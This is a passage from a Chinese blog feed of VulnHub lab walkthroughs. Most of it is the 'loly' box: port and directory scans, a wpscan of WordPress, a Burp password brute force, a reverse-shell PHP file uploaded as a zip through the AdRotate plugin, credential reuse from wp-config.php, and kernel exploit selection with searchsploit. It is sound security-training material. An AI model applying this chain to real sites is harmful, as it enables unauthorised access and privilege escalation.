class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:b4:24:08 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.145/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1138sec preferred_lft 1138sec<br>    inet6 fe80::20c:29ff:feb4:2408/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:b0:73:a4:a9 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0<br>       valid_lft forever preferred_lft forever<br>4: br-c987d2b66beb: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:ee:8e:c2:ab brd ff:ff:ff:ff:ff:ff<br>    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-c987d2b66beb<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::42:eeff:fe8e:c2ab/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>1590: vethdb2139e@if1589: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default <br>    <span class="hljs-built_in">link</span>/ether 92:cf:34:bd:2d:e9 brd ff:ff:ff:ff:ff:ff link-netnsid 0<br>    inet6 fe80::90cf:34ff:febd:2de9/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>1592: veth4a06cb7@if1591: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default <br>    <span class="hljs-built_in">link</span>/ether 4a:d7:e0:f7:06:23 brd ff:ff:ff:ff:ff:ff link-netnsid 1<br>    inet6 fe80::48d7:e0ff:fef7:623/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@geisha:~<span class="hljs-comment"># uname -a</span><br>Linux geisha 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><p>这里如果想不到这个思路，可以翻一翻 autowords 来考虑读取哪些敏感文件</p><p><img src="/pic/022f86227f858f8e0d05b0b9a8a562ac_MD5.png"></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>loly 靶机</title>
    <link href="/2023/08/81677a8f4b9c.html"/>
    <url>/2023/08/81677a8f4b9c.html</url>
    
    <content type="html"><![CDATA[<h1 id="loly-靶机"><a href="#loly-靶机" class="headerlink" title="loly 靶机"></a>loly 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/loly]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.144          <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 09:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.144<br>Host is up (0.00085s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br>MAC Address: 00:0C:29:87:63:9E (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.02 seconds<br></code></pre></td></tr></table></figure><p>只开放了 80 端口？UDP 扫描试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/loly]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.144   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 09:58 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.144<br>Host is up (0.00045s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   open|filtered msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   open|filtered microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   open|filtered syslog<br>520/udp   open|filtered route<br>631/udp   closed        ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 00:0C:29:87:63:9E (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.45 seconds<br></code></pre></td></tr></table></figure><p>没收获，版本探测吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/loly]<br>└─$ sudo nmap -sT -sV -sC -O -p80 192.1.1.144            <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 09:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.144<br>Host is up (0.00043s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    nginx 1.10.3 (Ubuntu)<br>|_http-server-header: nginx/1.10.3 (Ubuntu)<br>|_http-title: Welcome to nginx!<br>MAC Address: 00:0C:29:87:63:9E (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.45 seconds<br></code></pre></td></tr></table></figure><p>看来没什么突破口了，80 端口直接进去是默认界面</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破找一找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/loly]<br>└─$ sudo dirsearch -u http://192.1.1.144               <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.144/_23-08-26_10-00-09.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-26_10-00-09.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.144/<br><br>[10:00:09] Starting: <br>[10:00:49] 200 -    7KB - /wordpress/wp-login.php                           <br>[10:00:49] 200 -   28KB - /wordpress/<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>wordpress 啊，在浏览器里看看</p><p>发现显示有问题，看源码发现了一个域名 <code>loly.lc</code> 将其写入 hosts 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/loly]<br>└─$ sudo vim /etc/hosts<br></code></pre></td></tr></table></figure><p>再访问，显示正常了。</p><p><img src="/pic/1ec13cc5dd6a69d74757db87c4d8d6ac_MD5.png"></p><h2 id="Wordpress-渗透"><a href="#Wordpress-渗透" class="headerlink" title="Wordpress 渗透"></a>Wordpress 渗透</h2><p>感觉还挺好看的，wpscan 一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/loly]<br>└─$ sudo wpscan --url http://loly.lc/wordpress -e ap,u                                                              <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | \<span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.24</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://loly.lc/wordpress/ [192.1.1.144]</span><br><span class="hljs-string">[+] Started: Mon Aug 28 02:27:05 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Headers</span><br><span class="hljs-string"> | Interesting Entry: Server: nginx/1.10.3 (Ubuntu)</span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://loly.lc/wordpress/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://loly.lc/wordpress/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://loly.lc/wordpress/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://loly.lc/wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.5&lt;/generator&gt;</span><br><span class="hljs-string"> | Confirmed By: Emoji Settings (Passive Detection)</span><br><span class="hljs-string"> |  - http://loly.lc/wordpress/, Match: &#x27;</span>wp-includes\/js\/wp-emoji-release.min.js?ver=5.5<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: feminine-style</span><br><span class="hljs-string"> | Location: http://loly.lc/wordpress/wp-content/themes/feminine-style/</span><br><span class="hljs-string"> | Last Updated: 2023-08-01T00:00:00.000Z</span><br><span class="hljs-string"> | Readme: http://loly.lc/wordpress/wp-content/themes/feminine-style/readme.txt</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 3.0.4</span><br><span class="hljs-string"> | Style URL: http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5</span><br><span class="hljs-string"> | Style Name: Feminine Style</span><br><span class="hljs-string"> | Style URI: https://www.acmethemes.com/themes/feminine-style</span><br><span class="hljs-string"> | Description: Feminine Style is a voguish, dazzling and very appealing WordPress theme. The theme is completely wo...</span><br><span class="hljs-string"> | Author: acmethemes</span><br><span class="hljs-string"> | Author URI: https://www.acmethemes.com/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 1.0.0 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5, Match:  Version: 1.0.0</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="hljs-string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] Plugin(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] adrotate</span><br><span class="hljs-string"> | Location: http://loly.lc/wordpress/wp-content/plugins/adrotate/</span><br><span class="hljs-string"> | Last Updated: 2023-08-14T14:57:00.000Z</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 5.12.4</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 5.8.6.2 (80% confidence)</span><br><span class="hljs-string"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="hljs-string"> |  - http://loly.lc/wordpress/wp-content/plugins/adrotate/readme.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] User(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] loly</span><br><span class="hljs-string"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] A WordPress Commenter</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Mon Aug 28 02:27:09 2023</span><br><span class="hljs-string">[+] Requests Done: 56</span><br><span class="hljs-string">[+] Cached Requests: 7</span><br><span class="hljs-string">[+] Data Sent: 15.305 KB</span><br><span class="hljs-string">[+] Data Received: 428.714 KB</span><br><span class="hljs-string">[+] Memory used: 246.496 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:04</span><br></code></pre></td></tr></table></figure><p>发现了一个插件 <code>adrotate</code> 和一个用户名 <code>loly</code></p><p>搜索此插件是否有漏洞，搜到的都是老版本的漏洞。又尝试了一下搜索 wordpress 版本的漏洞，也没收获，忘记密码界面尝试了 admin 和 loly，确认了没有 admin 用户名</p><p>那就只能尝试爆破了，使用 burp 抓包，然后 burp 自带的字典来爆破</p><p><img src="/pic/abbe0215785fdeaf389683b2701ad574_MD5.png"></p><p>得到了一个密码 <code>fernando</code></p><p>尝试使用此密码登录后台。</p><p><img src="/pic/9cde9fb8db9277607e48826151beb27b_MD5.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>有个很尴尬的问题，似乎修改主题的源码和上传主题和插件都被扣掉了。翻来翻去感觉突破点只有 adrotate 插件中管理资源的界面了</p><p><img src="/pic/e0f7135fb9d1f5fd6e1b63fd81451399_MD5.png"></p><p>有个上传文件的位置，但是这个地方应该是白名单，而且使用 %00 截断也没法绕过，卡了一段时间。仔细看了一遍支持的格式，发现其中有 zip，注释里也说了会自动解压，那就把反弹 shell 的 php 文件压缩后上传上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/loly]<br>└─$ zip php.zip php-reverse-shell.php <br>  adding: php-reverse-shell.php (deflated 60%)<br></code></pre></td></tr></table></figure><p>虽然提示了上传成功，但是在底下没看到回显</p><p>刚开始以为没上传成功，又卡了一段时间，尝试 curl，发现有反弹 shell 成功了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@ubuntu:/$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@ubuntu:/$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:87:63:9e brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.144/24 brd 192.1.1.255 scope global ens33<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::20c:29ff:fe87:639e/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>www-data@ubuntu:/$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux ubuntu 4.4.0-31-generic <span class="hljs-comment">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@ubuntu:/$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看看有哪些用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/$ <span class="hljs-built_in">ls</span> -alih /home <br><span class="hljs-built_in">ls</span> -alih /home<br>total 12K<br>655361 drwxr-xr-x  3 root root 4.0K Aug 19  2020 .<br>     2 drwxr-xr-x 22 root root 4.0K Aug 19  2020 ..<br>655370 drwxr-xr-x  3 loly loly 4.0K Aug 27 19:31 loly<br></code></pre></td></tr></table></figure><p>有个 loly 的用户，接下来去看看 wordpress 的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:~/html/wordpress$ <span class="hljs-built_in">ls</span>  <br><span class="hljs-built_in">ls</span><br>index.php        wp-blog-header.php    wp-includes        wp-settings.php<br>license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php<br>readme.html      wp-config.php         wp-load.php        wp-trackback.php<br>wp-activate.php  wp-content            wp-login.php       xmlrpc.php<br>wp-admin         wp-cron.php           wp-mail.php<br>www-data@ubuntu:~/html/wordpress$ <span class="hljs-built_in">cat</span> wp-config.php<br><span class="hljs-built_in">cat</span> wp-config.php<br><br>define( <span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;wordpress&#x27;</span> );<br><br>/** MySQL database username */<br>define( <span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;wordpress&#x27;</span> );<br><br>/** MySQL database password */<br>define( <span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;lolyisabeautifulgirl&#x27;</span> );<br><br>/** MySQL hostname */<br>define( <span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span> );<br><br>/** Database Charset to use <span class="hljs-keyword">in</span> creating database tables. */<br>define( <span class="hljs-string">&#x27;DB_CHARSET&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span> );<br></code></pre></td></tr></table></figure><p>发现了数据库连接的密码，尝试用这个密码登录 loly 用户。同时又使用爆破出的密码和这个密码，尝试 su 切换为 root 用户，失败。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:~/html/wordpress$ su loly<br>su loly<br>Password: lolyisabeautifulgirl<br><br>loly@ubuntu:/var/www/html/wordpress$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>loly<br>loly@ubuntu:/var/www/html/wordpress$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(loly) gid=1000(loly) <span class="hljs-built_in">groups</span>=1000(loly),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)<br>loly@ubuntu:/var/www/html/wordpress$ sudo -l <br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> loly: lolyisabeautifulgirl<br><br>Sorry, user loly may not run sudo on ubuntu.<br></code></pre></td></tr></table></figure><p>尝试查看 SUID 文件、passwd 和 shadow 文件权限、家目录下的敏感文件，均无收获。</p><p>尝试使用 linpeas.sh 来辅助收集信息，依然没有收获</p><p>只能尝试内核提权了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">loly@ubuntu:/tmp$ <span class="hljs-built_in">uname</span> -a                                                                                           <br><span class="hljs-built_in">uname</span> -a                                                                                                             <br>Linux ubuntu 4.4.0-31-generic <span class="hljs-comment">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux             </span><br>loly@ubuntu:/tmp$ <span class="hljs-built_in">cat</span> /etc/issue                                                                                     <br><span class="hljs-built_in">cat</span> /etc/issue                                                                                                       <br>Ubuntu 16.04.1 LTS \n \l <br></code></pre></td></tr></table></figure><p><img src="/pic/f0c857a475e6618ba04996a09ea8033d_MD5.png"></p><p>筛选一下</p><p><img src="/pic/9182e879ecd7839bf572905e876ec9c6_MD5.png"></p><p>比较符合的有这些。在优先级的选择上我经验还是不太足，逐个尝试了四五个才找到哪个可以提权成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/loly]<br>└─$ searchsploit -m 45010 <br>  Exploit: Linux 